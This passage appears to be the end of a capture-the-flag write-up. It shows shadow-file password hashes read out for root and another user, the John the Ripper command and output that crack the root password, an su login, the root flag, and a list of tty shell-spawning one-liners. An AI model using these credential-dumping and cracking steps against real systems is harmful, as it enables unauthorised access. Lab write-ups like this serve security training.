+<p>This writes a random file in /tmp/SSH (might need to make that dir!)</p>
+
+<p>When I open it, root stuff!</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root
+$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
+18226
+0
+99999
+7
+
+
+
+
+robert
+$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
+18163
+0
+99999
+7
+
+</code></pre></div></div>
+
+<p>I stick</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john forJohn.txt 
+</code></pre></div></div>
+
+<p>it runs on default wordlist to get to get <strong>mercedes</strong></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Created directory: /home/bhero/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+mercedes         (?)
+1g 0:00:00:00 DONE 2/3 (2019-12-11 21:34) 1.754g/s 1347p/s 1347c/s 1347C/s crystal..bigben
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>I can use this to login</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
+mercedes
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>root.txt
+512fd4429f33a113a44d5acde23609e3
+</code></pre></div></div>
+
+<h2 id="tools">Tools</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install gobuster
+</code></pre></div></div>
+
+<p>tty shells:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/sh -i
+python -c 'import pty; pty.spawn("/bin/sh")'
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+</code></pre></div></div>
+:ET
